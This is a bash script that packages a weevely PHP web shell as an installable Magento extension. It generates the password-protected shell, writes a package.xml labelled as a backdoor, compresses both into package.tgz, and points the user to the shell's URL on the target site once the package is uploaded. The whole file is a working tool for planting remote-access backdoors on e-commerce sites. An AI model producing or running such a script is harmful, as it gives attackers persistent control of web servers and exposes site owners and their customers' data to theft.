#!/bin/bash
#
#	This is a simle bash script to create magento backdoored plugin (Debian only).
#	Reference : https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html
#	plugin structure should be like this : 
#
#
#	$ tree 
#	.
#	├── errors
#	│   └── backdoor.php
#	└── package.xml
#
#
#	check if packages required for generating shell are installed on not?
#
#		weevely		
#
if [[ "Status: install ok installed" == `dpkg -s weevely |grep Status` ]];then
	echo "[+]weevely found"
else
	echo "[-]weevely not found"
	exit 1;
fi
#
#	generate backdoor using weevely
#
read -e -p "Enter password for your weevely shell:" password
read -e -p "Enter name for your weevely shell(.php will be appended by script):" name
mkdir ./errors
weevely generate $password ./errors/$name.php
file_hash=`md5sum ./errors/$name.php`

echo "<?xml version="1.0"?>
<package>
<name>backdoor</name>
<version>1.3.3.7</version>
<stability>devel</stability>
<licence>backdoor</licence>
<channel>community</channel>
<extends/>
<summary>Backdoor for magento</summary>
<description>Backdoor for magento</description>
<notes>backdoor</notes>
<authors>
    <author>
        <name>lokendra singh rawat</name>
        <user>lokendra</user>
        <email>lokendrasinghrawat@pm.me</email>
    </author>
</authors>
<date>2019-06-24</date>
<time>13:47:49</time>
<contents>
    <target name="mage">
        <dir>
            <dir name="errors">
                <file name="$name" hash="$file_hash"/>
            </dir>
        </dir>
    </target>
</contents>
<compatible/>
<dependencies>
    <required>
        <php>
            <min>5.2.0</min>
            <max>6.0.0</max>
        </php>
    </required>
</dependencies>
</package>
" >package.xml
#
#	compressing plugin
#
tar -cvzf package.tgz errors/$name package.xml
rm -rf errors package.xml
echo "After uploadng access your backdoor at : http://target.com/errors/$name.php"


